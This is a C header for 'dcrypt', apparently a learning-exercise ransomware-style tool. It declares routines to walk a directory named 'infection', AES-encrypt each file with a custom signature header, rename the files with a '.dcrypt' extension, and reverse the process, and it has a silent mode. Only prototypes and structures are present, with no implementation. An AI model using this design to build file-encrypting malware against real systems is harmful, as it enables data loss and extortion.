#ifndef DCRYPT_H
# define DCRYPT_H

# include <stdio.h>
# include <stdlib.h>
# include <fcntl.h>
# include <unistd.h>
# include <stdint.h>
# include <sys/mman.h>      // For mapping
# include <elf.h>           // For ELF header
# include <string.h>
# include <time.h>          // For rand & srand (encryption key generation)
# include <dirent.h>        // For looping through directory
# include <stdbool.h>
# include <sys/stat.h>      // For checking if directory
# include <getopt.h>        // For argv parsing

# include <openssl/aes.h>   // For AES key generation
# include <openssl/rand.h>

# include "ascii_format.h"


/*------------------------ Defines, enum, struct --------------------------*/

// About the program
# define DC_PROG_VERSION        "2.1.0"
# define DC_PROG_AUTHOR         "d."
# define DC_PROG_NAME           "dcrypt"

// Paths of the target directories
# define DC_TARGET_ARRAY_SIZE   1
# define DC_TARGET_PATHS        { "/home/mint/infection" } // No '/' at the end

// Unhandled paths
# define DC_UNHANDLED_DIRS_ARRAY_SIZE   2
# define DC_UNHANDLED_DIRS      { ".", ".." }

// Returns
enum e_returns
{
    DC_SUCCESS,
    DC_ERROR
};

// Maximum amount of handled files on a directory
# define DC_MAX_FILES           1024

// Charset used for the encryption key
# define DC_KEYCHARSET          "abcdefghijklmnopqrstuvwxyz" \
                                "ABCDEFGHIJKLMNOPQRSTUVWXYZ" \
                                "0123456789"

// Signature injected in the target files's dcrypt header
# define DC_SIGNATURE           "2DCRYPT!"
# define DC_DCRYPT_EXT          "dcrypt"
# define DC_DCRYPT_EXT_SIZE     7
# define DC_AES_KEY_SIZE        16
# define DC_AES_BLOCK_SIZE      16

enum e_modes
{
    // Display detailed notifications
    DC_VERBOSE                  = 1,
    DC_REVERSE                  = 2
};

enum e_dcrypt_header
{
    DC_DCRYPT_HEADER_SIZE       = 0x0026,
    DC_MAGICNBR_SIZE            = 8,
    DC_IV_SIZE                  = 16,
};

/*
 * This is the dcrypt header that is written before the original header.
 * It has a size of 0x0026 (= 38) bytes.
 */

typedef struct s_dcrypt_header
{
    // 0x0000 Magic value/signature to identify encrypted files.
    uint8_t     signature[DC_MAGICNBR_SIZE];

    /*
     * 0x0008 AES-128 encryption's Initialization Vector (IV).
     * A 16 bytes key is stored here in plaintext.
     */

    uint8_t     iv_key[DC_IV_SIZE];

    // 0x001e Original file size
    uint64_t    original_filesize;

    // 0x0026 Encrypted file contents (AES-128 CBC)
}               t_dcrypt_header;

/*---------------------------- Global variables ---------------------------*/

typedef struct s_env
{
    unsigned char       *mapped_data; // file is mapped in memory here
    uint16_t            modes;        // options given from command line
    t_dcrypt_header     dcrypt_header;
    size_t              encrypted_filesize;
    unsigned char       *encryption_key;
    unsigned char       *decryption_key;
    bool                key_allocated;
    size_t              handled_file_count;
}   t_env;

/*---------------------------- Function prototypes ------------------------*/

void    parse_argv(t_env *env, int argc, char *argv[]);
void    detect_silent_mode(t_env *env, int argc, char *argv[]);

char    *get_filename(char *argv[]);
int     map_file_into_memory(t_env *env, const char *filename);
int     process_mapped_data(t_env *env);
int     write_processed_data_to_file(t_env *env, const char *target_path);

/*---------------------------- Cryptography ------------------------*/

void    xor_with_additive_cipher(
    void *key, size_t key_length, void *data, size_t data_length, int mode);

int     aes_encrypt_data(unsigned char *data, size_t data_len, \
    const unsigned char *key, unsigned char *iv);
int     aes_decrypt_data(unsigned char *data, size_t data_len, \
    const unsigned char *key, unsigned char *iv);
unsigned char    *generate_time_based_rand_key_nanosec(const char *_charset, \
    size_t strength);
unsigned char    *generate_random_based_key(const char *_charset, \
    size_t strength, bool blocking);
unsigned char    *get_encryption_key(t_env *env);

/*---------------------------- File handling ------------------------*/

bool    is_extension_handled(t_env *env, char *filepath);
void    handle_dir(t_env *env, char *target_dir_path);

#endif
